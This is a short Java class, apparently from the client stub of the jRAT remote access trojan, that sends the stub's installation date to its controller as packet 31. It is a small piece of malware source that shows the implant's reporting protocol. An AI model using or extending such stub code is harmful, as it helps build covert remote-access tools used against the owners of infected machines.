package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet31InitInstallationDate extends AbstractOutgoingPacket {

	private String date;

	public Packet31InitInstallationDate(String date) {
		this.date = date;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		if (this.date == null) {
			this.date = "Unknown";
		}
		sw.writeLine(this.date);
	}

	@Override
	public byte getPacketId() {
		return (byte) 31;
	}

}
